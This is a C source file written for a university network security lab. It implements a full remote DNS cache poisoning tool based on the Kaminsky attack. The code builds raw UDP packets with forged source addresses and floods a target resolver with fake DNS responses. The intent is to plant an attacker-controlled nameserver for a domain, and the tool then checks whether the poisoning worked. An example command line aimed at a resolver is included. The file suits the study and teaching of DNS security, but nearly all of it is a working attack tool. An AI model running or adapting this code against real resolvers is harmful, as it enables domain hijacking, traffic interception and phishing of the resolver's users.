// ------------------------------------------------------------------------------------------------ 
/*  Purdue CS528 - Network Security - Spring 2016
**  Lab 2: Remote DNS Cache Poisoning
**  Kyriakos Ispoglou (ispo)
**
**  Task: Remote Cache Poisoning using parallel Kamisky attack
**
**  References: 
**      [1]. The TCP/IP Guide: A Comprehensive, Illustrated Internet Protocols Reference,
**           No Starch Press; 1 edition (October 1, 2005)
**      [2]. Kaminsky Attack: http://unixwiz.net/techtips/iguide-kaminsky-dns-vuln.html
**
**
**   * * * ---===== Introduction =====--- * * *
**
**  This program implements a remote cache poisoning attack using Kaminsky's observation. For more
**  information on how this attack works, refer to [2]. Let R be the resolver that we want to 
**  poison its cache, let foo.gr be the domain that we want to poison and let F be the DNS server
**  of foo.gr. We start by sending a DNS query for the subdomain r4nd0m.foo.gr to R. Because R 
**  don't have this random subdomain in its cache it send a DNS query to F trying to resolve that
**  bogus subdomain. At this time, we flood R with spoofed DNS responses (source address = F). In
**  these responses, we set address of r4nd0m.foo.gr to our desired address (let's say 9.9.9.9) 
**  but we also set the nameserver of foo.gr (9.9.9.9). If one of these responses has the same 
**  transaction ID with the original query, R will think that the spoofed response really comes 
**  from F, so it will store 9.9.9.9 as the nameserver of foo.gr. Otherwise we can try again with
**  a different subdomain.
**
**  Once R receives a valid DNS response (either from us or from F), it will reply to us with 
**  either a "No such name" response (attack failed) or a "r4nd0m.foo.gr is at 9.9.9.9" (cache
**  poisoning was successful).
**
**  The chances of guessing the right transaction ID is 1/65536, which is not very good. However,
**  if we send K parallel request and then send M spoofed responses, chances are much higher, 
**  because only 1 successful poisoning is enough. By exploiting the birthday paradox we only
**  need any of M responses to match with any of the K requests, which makes our chances much
**  higher (<< K*S/65536 though because many packets will be ignored). Be patient, you may need 
**  few minutes to successfully poison the domain.
**
**  Because this tool is written for a lab and not for a real attack, we did some assumptions:
**  [1]. There are no egress filters for spoofed packets
**  [2]. There's no source port randomization on R.
**
**
**   * * * ---===== Command Line Arguments =====--- * * *
**
**      --domain            Domain that you want to poison (foo.gr)
**      --ip                IP address of DNS server you want to poison (1.1.1.1)
**      --attacter-ns       Domain of attacker's nameserver (attacker.gr)
**      --attacter-ip       IP of attacker's nameserver (4.4.4.4)
**      --orig-ns           IP address of the original nameserver (9.9.9.9 -> ns.foo.gr)
**      --n-reqests         # of duplicate requests
**      --n-responses       # of cache poisoning attemps (#spoofed responses)
**      --n-tries           # of poisoning attacks
**      --verify            Verify whether attack was successfull. This makes attack slower.
**      --help              Display this message and exit
**
**  NOTE: When you verify the attack, you have to keep all sockets open for a small time.
**  For this reason don't use more than 100 parallel requests (--n-reqests <= 100). If you
**  start getting errors, set a smaller value for --n-reqests
**
**
**   * * * ---===== Examples =====--- * * *
**  
**  * Do a remote cache poisoning at Resolver 192.168.15.4. The domain you want to poison is
**  example.com and the IP of DNS server of example.com is 199.43.132.53. After poisoning, the
**  nameserver of example.com will be ns.dnslabattacker.net at 9.9.9.9. Use 100 parallel requests
**  and flood with 500 spoofed responses. If attack is not successful repeat it for 1000 times.
**  After each attack, verify if it was successful:
**
**  ./dns_cpoison --ip=192.168.15.4 --domain=example.com --orig-ns=199.43.132.53
**                --attacker-ns=ns.dnslabattacker.net --attacker-ip=9.9.9.9 
**                --n-requests=100 --n-responses=500 --n-tries=1000 --verify
**
**
**  (With these numbers, you need around ~1000 tries to poison example.com)
**
**   * * * ---===== TODO list =====--- * * *
**
**  [1]. Check whether malloc() returns NULL.
**  [2]. Check if there are issues with alignment during casting to data structures.
**  [3]. Implement other types of RR
**  [4]. Check if IPs and domains from command line are valid or not
*/
// ------------------------------------------------------------------------------------------------ 
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <getopt.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

/* MACRO declarations */
#define DNSSERV_BIND_PORT   53                          // listen port on DNS server
#define DNSSERV_SRC_PORT    33333                       // source port of DNS server
#define UDP_TIMEOUT         1                           // max timeout in UDP response
#define SMALL_TTL           64                          // a small Time-To-Live
#define BIG_TTL             86400                       // a big Time-To-Live (1D)
#define RAND_LEN            5                           // length of random subdomain
#define DNSRESP_SIZE        1024                        // max size of DNS response
#define RNDSD_LEN           256                         // max subdomain length
#define N_DUP_REQ           16                          // default number of duplicate requests
#define N_DUP_RESP          128                         // default number of duplicate responses
#define N_TRIES             64                          // default number of poisoning attacks
#define MAX_DUP_REQ         128                         // max number of duplicate requests
#define MAX_DUP_RESP        512                         // max number of duplicate responses
#define DNS_FLAG_RESP       0x8400                      // flags for DNS response packet
#define DNS_FLAG_QUES       0x0100                      // flags for DNS question packet
#define IPHDR_LEN           sizeof(struct iphdr)        // IP header length
#define UDPHDR_LEN          sizeof(struct udphdr)       // UDP header length
#define PRNT_HELP                                       /* print usage message */           \
    printf( "Usage: %s <attributes> \n"                                                     \
            "\t--domain\tDomain that you want to poison (foo.gr)\n"                         \
            "\t--ip\t\tIP address of DNS server you want to poison (1.1.1.1)\n"             \
            "\t--attacter-ns\tDomain of attacker's nameserver (attacker.gr)\n"              \
            "\t--attacter-ip\tIP of attacker's nameserver (4.4.4.4)\n"                      \
            "\t--orig-ns\tIP address of the original nameserver (9.9.9.9 -> ns.foo.gr)\n"   \
            "\n"                                                                            \
            "\t--n-reqests\t# of duplicate requests\n"                                      \
            "\t--n-responses\t# of cache poisoning attemps (#spoofed responses)\n"          \
            "\t--n-tries\t# of poisoning attacks\n"                                         \
            "\t--verify\tVerify whether attack was successfull. This makes attack slower.\n"\
            "\n"                                                                            \
            "\t--help\t\tDisplay this message and exit\n\n", argv[0] )

/* type/enum definitions */
typedef struct { uint8_t *p; size_t l; } pkt_t;         // packet + length

/* DNS class and type enums */
enum RR_TYPE   {A=1, NS=2, CNAME=5, SOA=6, PTR=12, MX=15, TXT=16};
enum DNS_CLASS {IN=1, CH=3, HS=4};
// ------------------------------------------------------------------------------------------------



///////////////////////////////////////////////////////////////////////////////////////////////////
//                                                                                               //
//                                      PACKET TRANSMISSION                                      //
//                                                                                               //
///////////////////////////////////////////////////////////////////////////////////////////////////

// ------------------------------------------------------------------------------------------------
/*
**  chksum(): Calculate checksum of a specific buffer.
**
**  Arguments: buf (uint8_t*)  : buffer to calculate its checksum
**             buflen (size_t) : buffer's size inb bytes
**
**  Return Value: The buffer's checksum in BIG endian.
*/
uint16_t chksum( uint8_t buf[], size_t buflen )
{
    uint32_t sum = 0, i;                                // checksum, iterator

    if( buflen < 1 ) return 0;                          // if buffer is empty, exit

    for(i=0; i<buflen-1; i+=2) sum+=*(uint16_t*)&buf[i];// add all half-words together  

    if( buflen & 1 ) sum += buf[buflen - 1];            // if you missed last byte, add it

    return ~((sum >> 16) + (sum & 0xffff));             // fold high to low order word
                                                        // return 1's complement
}
// ------------------------------------------------------------------------------------------------
/*
**  snd_spfd_pkt(): Send a DNS packet. This function generates a raw IP packet. The payload of 
**      the IP packet is a UDP packet. The payload of the UDP packet is a DNS packet. Because 
**      source IP must be spoofed, we have to use raw sockets.
**
**  Arguments: srcip (char*)    : source IP address
**             dstip (char*)    : destination IP address
**             sport (uint16_t) : source port 
**             dport (uint16_t) : destination port
**             dnspkt (pkt_t)   : DNS packet payload
**
**  Return Value: 0 on success, -1 on failure.
*/
int snd_spfd_pkt( char *srcip, char *dstip, uint16_t sport, uint16_t dport, pkt_t dnspkt )
{
    pkt_t pkt = {                                       // buffer for whole packet
        .p = malloc(IPHDR_LEN + UDPHDR_LEN + dnspkt.l), // allocate memory for the packet
        .l =        IPHDR_LEN + UDPHDR_LEN + dnspkt.l
    };

    struct sockaddr_in trg_addr = {                     // target's address information
            .sin_zero        = { 0,0,0,0,0,0,0,0 },     // zero this out
            .sin_family      = AF_INET,                 // IPv4
            .sin_port        = 0,                       // ignore this      
            .sin_addr.s_addr = inet_addr(dstip)         // set destination address
        };

    struct iphdr  *iph  = (struct iphdr*)  pkt.p;       // IP header within packet
    struct udphdr *udph = (struct udphdr*) (iph + 1);   // UDP header within packet

    int sd, retn = 0, on = 1;                           // raw socket descriptor / return value / flag


    /* ------------------------------------------------------------------------
     * Create the IP and UDP headers among with UDP payload for the packet
     *
     * The problem: UDP checksum is the checksum of the entire UDP datagram
     * plus a special pseudo-header which contains: src ip, dst ip, a reserved
     * byte, protocol number and length from UDP header. Calculating checksum
     * of this pseudo-header can end up in really ugly code. A nice trick is to
     * fill the fields of the pseudo-header in the IP/UDP headers, leaving all
     * other fields 0 (which is not affect the checksum calculation). The only
     * problem here is the alignment. However it happens that the fields in the
     * pseudo-header have the same alignment with the IP/UDP headers, so we're
     * fine here :)
     * ------------------------------------------------------------------------ */
    bzero(pkt.p, pkt.l);                                // zero out fields first

    /* fill pseudo-header fields in IP header */
    iph->saddr    = inet_addr(srcip);                   // spoofed source IP
    iph->daddr    = inet_addr(dstip);                   // target's IP
    iph->protocol = IPPROTO_UDP;                        // set upper layer protocol (it's UDP)
    iph->tot_len  =  htons(pkt.l - IPHDR_LEN);          // set packet's total length

    /* fill pseudo-header fields in UDP header */
    udph->source = htons(sport);                        // set source port
    udph->dest   = htons(dport);                        // set destination port
    udph->len    = htons(pkt.l - IPHDR_LEN);            // set packet length    
    udph->check  = 0;                                   // initialize checksum
    
    /* copy packet payload */
    memcpy(&pkt.p[IPHDR_LEN + UDPHDR_LEN], dnspkt.p, dnspkt.l);

    /* time for our trick. pseudo-header is ready */    
    udph->check   = chksum(pkt.p, pkt.l);               // checksum of pseudo-header + UDP payload

    /* fill the rest of IP header */
    iph->version  = 4;                                  // IPv4
    iph->ihl      = 5;                                  // no options
    iph->tos      = 0;                                  // no QoS
    iph->tot_len  = htons(pkt.l);                       // set packet's total length
    iph->id       = htons(9999);                        // set some ID
    iph->frag_off = 0;                                  // no fragments (and no offset)
    iph->ttl      = 64;                                 // TTL
    iph->check    = 0;                                  // set to 0 for now
    iph->check    = chksum(pkt.p, 20);                  // calculate checksum of the header


    /* ------------------------------------------------------------------------
     * Send the packet using raw sockets
     * ------------------------------------------------------------------------ */
    /* make a raw socket */
    if((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        perror("[-] Error! Cannot create raw socket");
        retn = -1;                                      // failure :(
    }

    /* inform kernel that we have added packet headers */
    else if( setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0 ) {
        perror("[-] Error! Cannot set IP_HDRINCL");
        retn = -1;                                      // failure :(
    }

    /* send spoofed packet (set routing flags to 0) */
    else if(sendto(sd, pkt.p, pkt.l, 0, (struct sockaddr*)&trg_addr, sizeof(trg_addr)) < 0) {
        perror("[-] Error! Cannot send spoofed packet");
        retn = -1;                                      // failure :(
    }
//  Don't be so verbose :P
//  else 
//      printf( "[+] Spoofed DNS packet sent successfully to %s!\n", dstip);

    free(pkt.p);                                        // release allocated memory
    close(sd);                                          // close socket
    return retn;                                        // success!
}
// ------------------------------------------------------------------------------------------------
/*
**  snd_pkt(): In case that we don't want to send a spoofed a packet, we send the DNS packet
**      through a normal UDP socket. We do this in order to be able to wait for the response later.
**
**  NOTE: In case that UDP packets have invalid checksum, enable checksum offloading (i.e. 
**      checksum will be calculated on NIC): "ethtool --offload eth0 rx off tx off".
**
**  Arguments: dstip (char*)    : destination IP address
**             dport (uint16_t) : destination port
**             dnspkt (pkt_t)   : DNS packet payload
**
**  Return Value: In an error occurs, function returns -1. Otherwise it returns the socket used
**      to send that packet. We need it to wait for a reponse later
*/
int snd_pkt( char *dstip, uint16_t dport, pkt_t dnspkt )
{
    int sockd;                                          // socket descriptor
    struct sockaddr_in trg_addr = {                     // DNS's address information
            .sin_zero        = { 0,0,0,0,0,0,0,0 },     // zero this out
            .sin_family      = AF_INET,                 // IPv4
            .sin_port        = htons(dport),            // DNS server's port
            .sin_addr.s_addr = inet_addr(dstip)         // set destination address
        };


    /* ------------------------------------------------------------------------
     * Send the DNS packet using a UDP socket
     * ------------------------------------------------------------------------ */
    if((sockd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("[-] Error! Cannot create UDP socket");      
        return -1;                                      // failure :(
    }

    /* send spoofed packet (set routing flags to 0) */
    if(sendto(sockd, dnspkt.p, dnspkt.l, 0, (struct sockaddr*)&trg_addr, sizeof(trg_addr)) < 0) {
        perror("[-] Error! Cannot send UDP packet");
        close( sockd );                                 // close socket
        return -1;                                      // failure :(
    }

    return sockd;                                       // return that open socket
}
// ------------------------------------------------------------------------------------------------
/*
**  rcv_pkt(): Receive a packet from a socket that previously sent a DNS request. Once you get
**      a response, close the socket (there's no need to stay open anymore).
*
**  Arguments: sockd (int)      : an open socket descriptor
**             pkt (pkt_t)      : DNS packet payload
**
**  Return Value: 0 on success, -1 on failure.
*/
int rcv_pkt( int sockd, pkt_t *pkt )
{
    struct timeval tv = { .tv_sec = UDP_TIMEOUT, .tv_usec = 0 };
    int n, retn = 0;                                    // return value (assume success)
    

    pkt->p = malloc(DNSRESP_SIZE);                      // allocate memory for response
    pkt->l = DNSRESP_SIZE;                              

    /* ------------------------------------------------------------------------
     * Receive a DNS packet from an opened UDP socket
     * (socket is already "open" so we set sockaddr_in information to NULL)
     * ------------------------------------------------------------------------ */    
    if( setsockopt(sockd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) < 0 ) {
        perror("[-] Error! Cannot set timeout for UDP socket");
        retn = -1;                                      // failure :(
    }

    else if( (n = recvfrom(sockd, pkt->p, pkt->l, 0, NULL, NULL)) < 0 ) {
        perror("[-] Error! Cannot receive UDP packet");
        retn = -1;                                      // failure :(
    }

    pkt->l = n;                                         // set packet size
      
    close( sockd );                                     // close socket
    return retn;                                        // success!
}
// ------------------------------------------------------------------------------------------------



///////////////////////////////////////////////////////////////////////////////////////////////////
//                                                                                               //
//                                    DNS PACKET MANIPULATION                                    //
//                                                                                               //
///////////////////////////////////////////////////////////////////////////////////////////////////

// ------------------------------------------------------------------------------------------------
/*
**  mk_dns_hdr(): Allocate memory for the DNS header and, fill it with the appropriate values.
**
**  Arguments: P (pkt_t*)        : where the raw DNS packet will be stored
**             id (uint16_t)     : identifier
**             flags (uint16_t)  : flags and codes
**             qcnt (uint16_t)   : question count
**             anscnt (uint16_t) : answer record count
**             nscnt (uint16_t)  : name server (authority record) count
**             addcnt (uint16_t) : additional record count          
**
**  Return Value: None.
**      Upon return, P will point to an allocated region which holds DNS packet header.
*/
void mk_dns_hdr( pkt_t *P, uint16_t id, uint16_t flags, uint16_t  qcnt, uint16_t anscnt, 
                 uint16_t nscnt, uint16_t addcnt )
{
    struct dnshdr {                                     // DNS packet header
        uint16_t id;                                    // identifier
        uint16_t flags;                                 // flags and codes
        uint16_t ques_cnt, ansr_cnt, ns_cnt, addr_cnt;  // record counters
    } __attribute__ ((packed)) *dnsh;


    P->p = malloc( sizeof(struct dnshdr) );             // allocate memory for header
    P->l = sizeof(struct dnshdr);                       // adjust size

    dnsh = (struct dnshdr*) P->p;                       // set struct pointer

    dnsh->id       = htons(id    );                     // set header fields
    dnsh->flags    = htons(flags );
    dnsh->ques_cnt = htons(qcnt  );
    dnsh->ansr_cnt = htons(anscnt);
    dnsh->ns_cnt   = htons(nscnt );
    dnsh->addr_cnt = htons(addcnt);
}
// ------------------------------------------------------------------------------------------------
/*
**  del_dns_pkt(): Free allocated memory for a DNS packet. We have a function for that to provice
**      a complete API to the user.
**
**  Arguments: P (pkt_t*) : the raw DNS packet
**
**  Return Value: None.
*/
void del_dns_pkt( pkt_t *P )
{
    free(P->p);                                         // release allocated memory
}
// ------------------------------------------------------------------------------------------------
/*
**  app_q_rec(): Append a question record to an existing DNS packet.
**
**  Arguments: P (pkt_t*)        : location of raw DNS packet
**             qclass (uint16_t) : question class
**             qtype (uint16_t)  : question type
**             qname (char*)     : question name
**
**  Return Value: The offset of the question name with in packet.
**      Upon return, P will contain the DNS packet with the question record appended to it.
*/
uint8_t app_q_rec( pkt_t *P, uint16_t qclass, uint16_t qtype, const char *qname )
{
    char    *tok, *s1, *s2;                             // auxiliary pointers
    uint8_t namoff;                                     // offset of qname in packet


    /* ------------------------------------------------------------------------
     * Augment packet's space to include the new question record.
     *
     * Question record contains name in DNS name notation (which is 2B bigger),
     * question type (2B) and question class (2B). Domain www.subdomain.foo.com
     * in DNS name notation becomes: \3www\9subdomain\3foo\3com\0
     * ------------------------------------------------------------------------ */
    P->p = realloc(P->p, P->l + strlen(qname) +2 +2 +2);

    /* The easiest way to convert a domain, is through strtok(). But because it */
    /* modifies original string, we have take a backup first. */
    s1 = malloc(strlen(qname) + 1);                     // get a backup
    s2 = s1;
    strcpy(s1, qname);

    namoff = P->l;                                      // name starts from here

    for(tok=strtok(s2, "."); tok; tok=strtok(NULL, ".")) {
        /* prepend each token with its length */
        sprintf( &P->p[P->l], "%c%s", (uint8_t)strlen(tok), tok );
        P->l += strlen(tok) + 1;                        // move pointer
    }

    P->p[P->l++]  = '\0';                               // finish with a NULL
    free(s1);                                           // release temp string

    *(uint16_t*)&P->p[P->l]     = htons(qtype);         // set type
    *(uint16_t*)&P->p[P->l + 2] = htons(qclass);        //  and class

    P->l += 4;                                          // adjust packet's length

    return namoff;                                      // return offset
}
// ------------------------------------------------------------------------------------------------
/*
**  app_r_rec(): Append a resource record to an existing DNS packet.
**
**  Arguments: P (pkt_t*)       : Location of raw DNS packet
**             class (uint16_t) : class of resource record
**             type (uint16_t)  : type of RR
**             rdata (char*)    : data portion of RR. Assume a NULL-terminating string 
**             off (uint8_t)    : offset of the name we resolve within packet 
**
**  Return Value: The offset of the question name with in packet.
**      Upon return, P will contain the DNS packet with the resource record appended to it.
*/
uint8_t app_r_rec( pkt_t *P, uint16_t class, uint16_t type, char *rdata, uint8_t off )
{
    char    *tok, *s1, *s2;                             // auxiliary pointers
    uint8_t namoff = -1;                                // offset of qname in packet


    /* Augment packet's space to include the new resource record. */
    /* When resolving A records use 4 bytes for the IP address */
    P->p = realloc(P->p, P->l +2 +2 +2 +4 +2 + (type == A ? 4 : strlen(rdata)+2));

    //  
    // TODO: Check if we have issues with alignment!
    //  
    *(uint16_t*)&P->p[P->l]     = htons(0xc000 | off);  // 0xc0 -> pointer to a name string
    *(uint16_t*)&P->p[P->l + 2] = htons(type);          // set type
    *(uint16_t*)&P->p[P->l + 4] = htons(class);         // set class
    *(uint32_t*)&P->p[P->l + 6] = htonl(BIG_TTL);       // set a big TTL

    P->l += 10;                                         // adjust size

    switch(type)                                        // check RR type
    {
        // --------------------------------------------------------------------
        case A:
            /* An A RR. rdata is the resolved IP address */
            *(uint16_t*)&P->p[P->l + 0] = htons(4);         
            *(uint32_t*)&P->p[P->l + 2] = inet_addr(rdata);
            P->l += 6;                              // adjust size
            break;
        // --------------------------------------------------------------------
        case NS:
            /* An NS RR. rdata is the nameserver's domain */            
            *(uint16_t*)&P->p[P->l] = htons(strlen(rdata)+2);
            P->l += 2;                              // adjust size              

            /* same code of app_q_rec(). If you don't like that, make it a function. */
            s1 = malloc(strlen(rdata) + 1);             // get a backup
            s2 = s1;
            strcpy(s1, rdata);

            namoff = P->l;                              // name starts from here

            for(tok=strtok(s2, "."); tok; tok=strtok(NULL, ".")) {
                /* prepend each token with its length */
                sprintf( &P->p[P->l], "%c%s", (uint8_t)strlen(tok), tok );
                P->l += strlen(tok) + 1;                // move pointer
            }

            P->p[P->l++]  = '\0';                       // finish with a NULL
            free(s1);                                   // release temp string

            break;
        // --------------------------------------------------------------------     
        //
        // TODO: Implement other types of RR
        //
        
        case CNAME:
        case SOA:
        case PTR:
        case MX:
        case TXT:
            break;
        // --------------------------------------------------------------------
    }

    return namoff;                                      // return offset
}
// ------------------------------------------------------------------------------------------------



///////////////////////////////////////////////////////////////////////////////////////////////////
//                                                                                               //
//                                MAIN CODE - DNS CACHE POISONING                                //
//                                                                                               //
///////////////////////////////////////////////////////////////////////////////////////////////////

// ------------------------------------------------------------------------------------------------
/*
**  main(): Our main function.
**
**  Return Value: 0 on success, -1 on failure.
*/
int main( int argc, char *argv[] )
{
    /* ------------------------------------------------------------------------
     * Local declarations
     * ------------------------------------------------------------------------ */      
    struct option longopt[] = {
        /* short options are dummy. Hide them from user and use only the long ones. */
        {"domain",     required_argument, 0, 'a'}, 
        {"ip",         required_argument, 0, 'b'}, 
        {"attacker-ns",required_argument, 0, 'c'}, 
        {"attacker-ip",required_argument, 0, 'd'}, 
        {"orig-ns",    required_argument, 0, 'e'}, 
        {"n-requests", required_argument, 0, 'f'}, 
        {"n-responses",required_argument, 0, 'g'},
        {"n-tries",    required_argument, 0, 'i'},
        {"verify",     no_argument,       0, 'j'},      
        {"help",       no_argument,       0, 'h'},
        {0,            0,                 0,  0 }
    };

    pkt_t D = {.p = NULL, .l = 0 };                     // DNS packet

    char    *domain=NULL, *ip=NULL, *attacker_ns=NULL, *attacker_ip=NULL, *orig_ns=NULL;
    uint16_t ndupreq=N_DUP_REQ, ndupresp=N_DUP_RESP, 
             ntries=N_TRIES, verify=0;                  // how aggressive is attack?
    char     rndsd[RNDSD_LEN];                          // random subdomain
    int      sockd[MAX_DUP_REQ];                        // UDP socket descriptors
    int      opt, longidx = 0;                          // getopt stuff
    int      cnt, i;                                    // counters
        
        
    /* ------------------------------------------------------------------------
     * Parse arguments
     * ------------------------------------------------------------------------ */      
    printf( "+--------------------------------------------------+\n"
            "|      PURDUE Univ. CS528 - Network Security       |\n"
            "|        Lab 2: Remote DNS Cache Poisoning         |\n"
            "|                                            -ispo |\n"
            "+--------------------------------------------------+\n\n" );

    /* parse options: for each option... */ 
    while( (opt = getopt_long(argc, argv, "a:b:c:d:e:f:g:i:jh", longopt, &longidx)) != -1) 
        switch(opt) 
        {           
            case 'a': domain      = optarg; break;      // Attacking domain 
            case 'b': ip          = optarg; break;      // IP of the attacking nameserver
            case 'c': attacker_ns = optarg; break;      // attacker's nameserver
            case 'd': attacker_ip = optarg; break;      // attacker's IP
            case 'e': orig_ns     = optarg; break;      // spoofed nameserver
            case 'f': ndupreq     = atoi(optarg); break;// # of duplicate requests
            case 'g': ndupresp    = atoi(optarg); break;// # of cache poisoning attempts
            case 'i': ntries      = atoi(optarg); break;// # of attacks
            case 'j': verify      = 1;      break;      // verify attack
            default : PRNT_HELP; return -1;             // failure
        }

    /* check arguments before proceed */
    if( !domain || !ip || !attacker_ns || !attacker_ip || !orig_ns ||
        ndupreq  < 1 || ndupreq  > MAX_DUP_REQ ||
        ndupresp < 1 || ndupresp > MAX_DUP_RESP ) 
    { 
        PRNT_HELP;                                      // something is missing
        return -1; 
    }

    srand(time(NULL));                                  // initialize PRG

    /* ------------------------------------------------------------------------
     * The actual DNS cache poisoning, using parallel Kaminsky Attack
     * Repeat until you succeed.
     * ------------------------------------------------------------------------ */
    for( cnt=1; cnt<=ntries; cnt++ )
    {
        printf( "[+] Attacking attempt #%d...\n", cnt );


        /* --------------------------------------------------------------------
         * Generate a random subdomain that probably doesn't exist
         * -------------------------------------------------------------------- */
        bzero(rndsd, RNDSD_LEN);                        // clear buffer

        for(i=0; i<RAND_LEN; ++i)
            rndsd[i] = 'a' + rand() % 26;               // fill a random subdomain

        rndsd[RAND_LEN] = '.';
        strncat(rndsd, domain, RNDSD_LEN-RAND_LEN-1);   // append the target domain

        printf( "[+] Generating random subdomain: %s\n", rndsd );


        /* --------------------------------------------------------------------
         * Send multiple DNS queries to the attacking nameserver
         * -------------------------------------------------------------------- */
        printf( "[+] Sending %d duplicate requests...\n", ndupreq );
        for( i=0; i<ndupreq; ++i )                          
        {
            /* look how easy is to create arbitrary dns packets <3 */
            /* do 1 question using a random transaction ID */
            mk_dns_hdr(&D, rand() % 0xffff, DNS_FLAG_QUES, 1, 0, 0, 0); 
            app_q_rec(&D, IN, A, rndsd);                // append question
            sockd[i] = snd_pkt(ip,DNSSERV_BIND_PORT,D); // send packet and store socket
            del_dns_pkt(&D);                            // cleanup packet buffer
        }


        /* --------------------------------------------------------------------
         * Now it's time for the actual attack. Flood attacking DNS with 
         * spoofed DNS responses hoping that transaction ID will match.
         * -------------------------------------------------------------------- */
        printf( "[+] Flooding with %d spoofed responses...\n", ndupresp );

        for( i=0; i<ndupresp; ++i )
        {
            int off1, off2;                             // name offsets


            /* create a fake DNS response. Packet should contain:
             * 1. Original question
             * 2. A bogus answer for the question
             * 3. A poisoned nameserver corresponding to the nameserver of attacking domain
             * 4. The IP address of that nameserver
             *
             * (we need off1 and off2 to know the location of the subdomains within DNS packet)
             */
            mk_dns_hdr(&D, rand() % 0xffff, DNS_FLAG_RESP, 1, 1, 1, 1);

            off1 = app_q_rec(&D, IN, A,  rndsd);
                   app_r_rec(&D, IN, A,  attacker_ip, off1);
            off2 = app_r_rec(&D, IN, NS, attacker_ns, off1+RAND_LEN+1 );
                   app_r_rec(&D, IN, A,  attacker_ip, off2);

            // assume source port is not randomized
            snd_spfd_pkt(orig_ns, ip, DNSSERV_BIND_PORT, DNSSERV_SRC_PORT, D);
            del_dns_pkt(&D);    
        }

        /* --------------------------------------------------------------------
         * Check if poisoning was successful
         * -------------------------------------------------------------------- */
        printf( "[+] Checking if poisoning was successful...\n" );
    
        for( i=0; i<ndupreq; ++i )
        {
            if( !verify ) {                             // if you don't want to verify attack,
                close( sockd[i] );                      // simply close socket
                continue;                               // and skip the rest
            }

            /* otherwise inspect normal DNS responses */

            rcv_pkt(sockd[i], &D);                      // wait for DNS response            


            /* If poisoning was successful, we'll get an RR for that dummy subdomain.
             * Otherwise we'll get 0 RR back (No such name message). By checking the
             * the number of Answer Record Count (at offset 6), we can infer whether
             * our attack was successful. We can use other metrics as well but that's
             * the simplest one.
             */     
            if( D.l > 8 && *(uint16_t*)&D.p[6] == htons(1) )
            {
                printf( "\n\n[+] Poisoning was successful!\n\n" );
                return 0;
            } 

            D.l = 0;
            free( D.p );                                // release packet
        }       

        printf( "[+] Cache poisoning failed. Trying again...\n" );
    }

    return 0;                                           // success!
}
// ------------------------------------------------------------------------------------------------
